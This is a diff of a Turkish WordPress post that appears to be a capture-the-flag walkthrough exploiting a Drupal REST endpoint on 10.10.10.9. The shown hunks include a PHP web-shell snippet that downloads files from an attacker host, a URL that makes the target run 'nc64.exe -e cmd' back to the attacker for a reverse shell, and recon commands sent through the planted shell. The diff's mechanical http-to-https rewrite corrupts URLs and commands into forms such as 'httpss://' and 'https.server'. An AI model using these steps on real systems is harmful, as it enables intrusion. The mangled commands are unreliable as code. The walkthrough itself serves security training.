@@ -16,12 +16,12 @@ categories: [Hacking - Security]
 
 <!-- wp:list -->
 <ul><!-- wp:list-item -->
-<li><a href="http://10.10.10.9/CHANGELOG.txt">https://10.10.10.9/CHANGELOG.txt</a></li>
+<li><a href="https://10.10.10.9/CHANGELOG.txt">httpss://10.10.10.9/CHANGELOG.txt</a></li>
 <!-- /wp:list-item --></ul>
 <!-- /wp:list -->
 
 <!-- wp:image {"id":4579} -->
-<figure class="wp-block-image"><img src="https://vk9-sec.com/wp-content/uploads/2021/03/word-image-150.png" alt="" class="wp-image-4579" /></figure>
+<figure class="wp-block-image"><img src="httpss://vk9-sec.com/wp-content/uploads/2021/03/word-image-150.png" alt="" class="wp-image-4579" /></figure>
 <!-- /wp:image -->
 
 <!-- wp:paragraph -->
@@ -37,7 +37,7 @@ categories: [Hacking - Security]
 <!-- /wp:preformatted -->
 
 <!-- wp:image {"id":4580} -->
-<figure class="wp-block-image"><img src="https://vk9-sec.com/wp-content/uploads/2021/03/word-image-151.png" alt="" class="wp-image-4580" /></figure>
+<figure class="wp-block-image"><img src="httpss://vk9-sec.com/wp-content/uploads/2021/03/word-image-151.png" alt="" class="wp-image-4580" /></figure>
 <!-- /wp:image -->
 
 <!-- wp:paragraph -->
@@ -49,7 +49,7 @@ categories: [Hacking - Security]
 <!-- /wp:preformatted -->
 
 <!-- wp:image {"id":4581} -->
-<figure class="wp-block-image"><img src="https://vk9-sec.com/wp-content/uploads/2021/03/word-image-152.png" alt="" class="wp-image-4581" /></figure>
+<figure class="wp-block-image"><img src="httpss://vk9-sec.com/wp-content/uploads/2021/03/word-image-152.png" alt="" class="wp-image-4581" /></figure>
 <!-- /wp:image -->
 
 <!-- wp:paragraph -->
@@ -61,7 +61,7 @@ categories: [Hacking - Security]
 <!-- /wp:preformatted -->
 
 <!-- wp:image {"id":4582,"width":608,"height":598} -->
-<figure class="wp-block-image is-resized"><img src="https://vk9-sec.com/wp-content/uploads/2021/03/word-image-153.png" alt="" class="wp-image-4582" width="608" height="598" /></figure>
+<figure class="wp-block-image is-resized"><img src="httpss://vk9-sec.com/wp-content/uploads/2021/03/word-image-153.png" alt="" class="wp-image-4582" width="608" height="598" /></figure>
 <!-- /wp:image -->
 
 <!-- wp:paragraph -->
@@ -69,21 +69,21 @@ categories: [Hacking - Security]
 <!-- /wp:paragraph -->
 
 <!-- wp:preformatted -->
-<pre class="wp-block-preformatted">https://10.10.10.9/rest_endpoint
+<pre class="wp-block-preformatted">httpss://10.10.10.9/rest_endpoint
 404 Bulunamadı</pre>
 <!-- /wp:preformatted -->
 
 <!-- wp:image {"id":4583} -->
-<figure class="wp-block-image"><img src="https://vk9-sec.com/wp-content/uploads/2021/03/word-image-154.png" alt="" class="wp-image-4583" /></figure>
+<figure class="wp-block-image"><img src="httpss://vk9-sec.com/wp-content/uploads/2021/03/word-image-154.png" alt="" class="wp-image-4583" /></figure>
 <!-- /wp:image -->
 
 <!-- wp:preformatted -->
-<pre class="wp-block-preformatted">https://10.10.10.9/rest
+<pre class="wp-block-preformatted">httpss://10.10.10.9/rest
 20OK (found)</pre>
 <!-- /wp:preformatted -->
 
 <!-- wp:image {"id":4584} -->
-<figure class="wp-block-image"><img src="https://vk9-sec.com/wp-content/uploads/2021/03/word-image-155.png" alt="" class="wp-image-4584" /></figure>
+<figure class="wp-block-image"><img src="httpss://vk9-sec.com/wp-content/uploads/2021/03/word-image-155.png" alt="" class="wp-image-4584" /></figure>
 <!-- /wp:image -->
 
 <!-- wp:paragraph -->
@@ -91,7 +91,7 @@ categories: [Hacking - Security]
 <!-- /wp:paragraph -->
 
 <!-- wp:preformatted -->
-<pre class="wp-block-preformatted">$url = ‘https://10.10.10.9’;
+<pre class="wp-block-preformatted">$url = ‘httpss://10.10.10.9’;
 
 $endpoint_path = ‘/rest’;
 
@@ -107,7 +107,7 @@ $file = [
 <!-- /wp:preformatted -->
 
 <!-- wp:image {"id":4585} -->
-<figure class="wp-block-image"><img src="https://vk9-sec.com/wp-content/uploads/2021/03/word-image-156.png" alt="" class="wp-image-4585" /></figure>
+<figure class="wp-block-image"><img src="httpss://vk9-sec.com/wp-content/uploads/2021/03/word-image-156.png" alt="" class="wp-image-4585" /></figure>
 <!-- /wp:image -->
 
 <!-- wp:paragraph -->
@@ -123,7 +123,7 @@ $file = [
 <!-- /wp:preformatted -->
 
 <!-- wp:image {"id":4586} -->
-<figure class="wp-block-image"><img src="https://vk9-sec.com/wp-content/uploads/2021/03/word-image-157.png" alt="" class="wp-image-4586" /></figure>
+<figure class="wp-block-image"><img src="httpss://vk9-sec.com/wp-content/uploads/2021/03/word-image-157.png" alt="" class="wp-image-4586" /></figure>
 <!-- /wp:image -->
 
 <!-- wp:paragraph -->
@@ -131,7 +131,7 @@ $file = [
 <!-- /wp:paragraph -->
 
 <!-- wp:image {"id":4587} -->
-<figure class="wp-block-image"><img src="https://vk9-sec.com/wp-content/uploads/2021/03/word-image-158.png" alt="" class="wp-image-4587" /></figure>
+<figure class="wp-block-image"><img src="httpss://vk9-sec.com/wp-content/uploads/2021/03/word-image-158.png" alt="" class="wp-image-4587" /></figure>
 <!-- /wp:image -->
 
 <!-- wp:paragraph -->
@@ -147,19 +147,19 @@ $file = [
 <!-- /wp:preformatted -->
 
 <!-- wp:image {"id":4588} -->
-<figure class="wp-block-image"><img src="https://vk9-sec.com/wp-content/uploads/2021/03/word-image-159.png" alt="" class="wp-image-4588" /></figure>
+<figure class="wp-block-image"><img src="httpss://vk9-sec.com/wp-content/uploads/2021/03/word-image-159.png" alt="" class="wp-image-4588" /></figure>
 <!-- /wp:image -->
 
 <!-- wp:paragraph -->
-<p>9. Kod başarıyla yürütüldü ve bize&nbsp;<a href="https://10.10.10.9/test.php">https://10.10.10.9/test.php</a>&nbsp;adresini ziyaret etmemizi söylüyor.</p>
+<p>9. Kod başarıyla yürütüldü ve bize&nbsp;<a href="httpss://10.10.10.9/test.php">httpss://10.10.10.9/test.php</a>&nbsp;adresini ziyaret etmemizi söylüyor.</p>
 <!-- /wp:paragraph -->
 
 <!-- wp:preformatted -->
-<pre class="wp-block-preformatted">https://10.10.10.9/test.php</pre>
+<pre class="wp-block-preformatted">httpss://10.10.10.9/test.php</pre>
 <!-- /wp:preformatted -->
 
 <!-- wp:image {"id":4589} -->
-<figure class="wp-block-image"><img src="https://vk9-sec.com/wp-content/uploads/2021/03/word-image-160.png" alt="" class="wp-image-4589" /></figure>
+<figure class="wp-block-image"><img src="httpss://vk9-sec.com/wp-content/uploads/2021/03/word-image-160.png" alt="" class="wp-image-4589" /></figure>
 <!-- /wp:image -->
 
 <!-- wp:paragraph -->
@@ -177,7 +177,7 @@ $file = [
 
 &nbsp; &nbsp; if (isset($_REQUEST[‘fupload’])) {
 
-&nbsp; &nbsp; &nbsp; &nbsp; file_put_contents($_REQUEST[‘fupload’], file_get_contents(“https://10.10.14.12:8888/” . $_REQUEST[‘fupload’]));
+&nbsp; &nbsp; &nbsp; &nbsp; file_put_contents($_REQUEST[‘fupload’], file_get_contents(“httpss://10.10.14.12:8888/” . $_REQUEST[‘fupload’]));
 
 &nbsp; &nbsp; };
 
@@ -205,7 +205,7 @@ $file = [
 <!-- /wp:preformatted -->
 
 <!-- wp:image {"id":4590} -->
-<figure class="wp-block-image"><img src="https://vk9-sec.com/wp-content/uploads/2021/03/word-image-161.png" alt="" class="wp-image-4590" /></figure>
+<figure class="wp-block-image"><img src="httpss://vk9-sec.com/wp-content/uploads/2021/03/word-image-161.png" alt="" class="wp-image-4590" /></figure>
 <!-- /wp:image -->
 
 <!-- wp:paragraph -->
@@ -217,7 +217,7 @@ $file = [
 <!-- /wp:preformatted -->
 
 <!-- wp:image {"id":4591} -->
-<figure class="wp-block-image"><img src="https://vk9-sec.com/wp-content/uploads/2021/03/word-image-162.png" alt="" class="wp-image-4591" /></figure>
+<figure class="wp-block-image"><img src="httpss://vk9-sec.com/wp-content/uploads/2021/03/word-image-162.png" alt="" class="wp-image-4591" /></figure>
 <!-- /wp:image -->
 
 <!-- wp:paragraph -->
@@ -229,11 +229,11 @@ $file = [
 <!-- /wp:paragraph -->
 
 <!-- wp:preformatted -->
-<pre class="wp-block-preformatted">https://10.10.10.9/vry4n.php?fexec=dir</pre>
+<pre class="wp-block-preformatted">httpss://10.10.10.9/vry4n.php?fexec=dir</pre>
 <!-- /wp:preformatted -->
 
 <!-- wp:image {"id":4592} -->
-<figure class="wp-block-image"><img src="https://vk9-sec.com/wp-content/uploads/2021/03/word-image-163.png" alt="" class="wp-image-4592" /></figure>
+<figure class="wp-block-image"><img src="httpss://vk9-sec.com/wp-content/uploads/2021/03/word-image-163.png" alt="" class="wp-image-4592" /></figure>
 <!-- /wp:image -->
 
 <!-- wp:paragraph -->
@@ -241,11 +241,11 @@ $file = [
 <!-- /wp:paragraph -->
 
 <!-- wp:preformatted -->
-<pre class="wp-block-preformatted">python3.9 -m http.server 8888</pre>
+<pre class="wp-block-preformatted">python3.9 -m https.server 8888</pre>
 <!-- /wp:preformatted -->
 
 <!-- wp:image {"id":4593} -->
-<figure class="wp-block-image"><img src="https://vk9-sec.com/wp-content/uploads/2021/03/word-image-164.png" alt="" class="wp-image-4593" /></figure>
+<figure class="wp-block-image"><img src="httpss://vk9-sec.com/wp-content/uploads/2021/03/word-image-164.png" alt="" class="wp-image-4593" /></figure>
 <!-- /wp:image -->
 
 <!-- wp:paragraph -->
@@ -253,13 +253,13 @@ $file = [
 <!-- /wp:paragraph -->
 
 <!-- wp:preformatted -->
-<pre class="wp-block-preformatted">https://10.10.10.9/vry4n.php?fupload=vk9sec.jpg
+<pre class="wp-block-preformatted">httpss://10.10.10.9/vry4n.php?fupload=vk9sec.jpg
 
-https:// 10.10.10.9/vk9sec.jpg</pre>
+httpss:// 10.10.10.9/vk9sec.jpg</pre>
 <!-- /wp:preformatted -->
 
 <!-- wp:image {"id":4594} -->
-<figure class="wp-block-image"><img src="https://vk9-sec.com/wp-content/uploads/2021/03/word-image-165.png" alt="" class="wp-image-4594" /></figure>
+<figure class="wp-block-image"><img src="httpss://vk9-sec.com/wp-content/uploads/2021/03/word-image-165.png" alt="" class="wp-image-4594" /></figure>
 <!-- /wp:image -->
 
 <!-- wp:paragraph -->
@@ -267,11 +267,11 @@ https:// 10.10.10.9/vk9sec.jpg</pre>
 <!-- /wp:paragraph -->
 
 <!-- wp:preformatted -->
-<pre class="wp-block-preformatted">https://10.10.10.9/vry4n.php?fexec=systeminfo</pre>
+<pre class="wp-block-preformatted">httpss://10.10.10.9/vry4n.php?fexec=systeminfo</pre>
 <!-- /wp:preformatted -->
 
 <!-- wp:image {"id":4595} -->
-<figure class="wp-block-image"><img src="https://vk9-sec.com/wp-content/uploads/2021/03/word-image-166.png" alt="" class="wp-image-4595" /></figure>
+<figure class="wp-block-image"><img src="httpss://vk9-sec.com/wp-content/uploads/2021/03/word-image-166.png" alt="" class="wp-image-4595" /></figure>
 <!-- /wp:image -->
 
 <!-- wp:paragraph -->
@@ -279,11 +279,11 @@ https:// 10.10.10.9/vk9sec.jpg</pre>
 <!-- /wp:paragraph -->
 
 <!-- wp:paragraph -->
-<p>17. Şimdi&nbsp;<a href="https://eternallybored.org/misc/netcat/">https://eternallybored.org/misc/netcat/ adresinden</a>&nbsp;Windows için bir x64 netcat indireceğiz.</p>
+<p>17. Şimdi&nbsp;<a href="httpss://eternallybored.org/misc/netcat/">httpss://eternallybored.org/misc/netcat/ adresinden</a>&nbsp;Windows için bir x64 netcat indireceğiz.</p>
 <!-- /wp:paragraph -->
 
 <!-- wp:paragraph -->
-<p><a href="https://eternallybored.org/misc/netcat/"></a></p>
+<p><a href="httpss://eternallybored.org/misc/netcat/"></a></p>
 <!-- /wp:paragraph -->
 
 <!-- wp:preformatted -->
@@ -291,11 +291,11 @@ https:// 10.10.10.9/vk9sec.jpg</pre>
 
 cd netcat-1.11 &amp;&amp; ls
 
-python3.9 -m http.sunucu 8888</pre>
+python3.9 -m https.sunucu 8888</pre>
 <!-- /wp:preformatted -->
 
 <!-- wp:image {"id":4596} -->
-<figure class="wp-block-image"><img src="https://vk9-sec.com/wp-content/uploads/2021/03/word-image-167.png" alt="" class="wp-image-4596" /></figure>
+<figure class="wp-block-image"><img src="httpss://vk9-sec.com/wp-content/uploads/2021/03/word-image-167.png" alt="" class="wp-image-4596" /></figure>
 <!-- /wp:image -->
 
 <!-- wp:paragraph -->
@@ -307,7 +307,7 @@ python3.9 -m http.sunucu 8888</pre>
 <!-- /wp:preformatted -->
 
 <!-- wp:image {"id":4597} -->
-<figure class="wp-block-image"><img src="https://vk9-sec.com/wp-content/uploads/2021/03/word-image-168.png" alt="" class="wp-image-4597" /></figure>
+<figure class="wp-block-image"><img src="httpss://vk9-sec.com/wp-content/uploads/2021/03/word-image-168.png" alt="" class="wp-image-4597" /></figure>
 <!-- /wp:image -->
 
 <!-- wp:paragraph -->
@@ -315,7 +315,7 @@ python3.9 -m http.sunucu 8888</pre>
 <!-- /wp:paragraph -->
 
 <!-- wp:preformatted -->
-<pre class="wp-block-preformatted">https://10.10.10.9/vry4n.php?fupload=nc64.exe&amp;fexec=nc64.exe -e cmd 10.10.14.12 7777</pre>
+<pre class="wp-block-preformatted">httpss://10.10.10.9/vry4n.php?fupload=nc64.exe&amp;fexec=nc64.exe -e cmd 10.10.14.12 7777</pre>
 <!-- /wp:preformatted -->
 
 <!-- wp:paragraph -->
@@ -323,7 +323,7 @@ python3.9 -m http.sunucu 8888</pre>
 <!-- /wp:paragraph -->
 
 <!-- wp:image {"id":4598} -->
-<figure class="wp-block-image"><img src="https://vk9-sec.com/wp-content/uploads/2021/03/word-image-169.png" alt="" class="wp-image-4598" /></figure>
+<figure class="wp-block-image"><img src="httpss://vk9-sec.com/wp-content/uploads/2021/03/word-image-169.png" alt="" class="wp-image-4598" /></figure>
 <!-- /wp:image -->
 
 <!-- wp:paragraph -->
@@ -331,7 +331,7 @@ python3.9 -m http.sunucu 8888</pre>
 <!-- /wp:paragraph -->
 
 <!-- wp:image {"id":4599} -->
-<figure class="wp-block-image"><img src="https://vk9-sec.com/wp-content/uploads/2021/03/word-image-170.png" alt="" class="wp-image-4599" /></figure>
+<figure class="wp-block-image"><img src="httpss://vk9-sec.com/wp-content/uploads/2021/03/word-image-170.png" alt="" class="wp-image-4599" /></figure>
 <!-- /wp:image -->
 
 <!-- wp:paragraph -->
@@ -343,7 +343,7 @@ python3.9 -m http.sunucu 8888</pre>
 <!-- /wp:paragraph -->
 
 <!-- wp:paragraph -->
-<p>ilgili link:&nbsp;<a href="https://www.exploit-db.com/exploits/41564">https://www.exploit-db.com/exploits/41564</a></p>
+<p>ilgili link:&nbsp;<a href="httpss://www.exploit-db.com/exploits/41564">httpss://www.exploit-db.com/exploits/41564</a></p>
 <!-- /wp:paragraph -->
 
 <!-- wp:paragraph -->
